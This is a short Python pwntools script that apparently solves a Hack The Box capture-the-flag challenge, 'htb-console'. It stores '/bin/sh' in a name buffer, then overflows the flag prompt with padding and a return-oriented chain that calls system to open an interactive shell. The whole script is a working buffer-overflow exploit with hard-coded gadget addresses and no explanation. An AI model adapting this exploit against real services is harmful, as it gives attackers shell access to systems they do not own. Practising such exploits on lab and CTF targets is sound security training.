from pwn import *

io = process('./htb-console')
#ip, port = 
#io = remote(ip, port)

elf = ELF('./htb-console')

padding = 'A'*24
pop_rdi_ret = 0x0000000000401473
ret = 0x000000000040101a

payload = '/bin/sh\x00'

io.sendlineafter('>> ', 'hof')
io.sendlineafter('Enter your name: ', payload)

payload = padding
payload += p64(pop_rdi_ret)
payload += p64(0x004040b0)
payload += p64(0x00401381)	#call system
#payload += p64(ret)
#payload += p64(elf.plt.system)
#payload += p64(elf.sym.system)
#print hex(elf.plt.system)
#print hex(elf.sym.system)

io.sendlineafter('>> ', 'flag')
io.sendlineafter('Enter flag: ', payload)
#io.recvuntil('\n')

io.interactive()
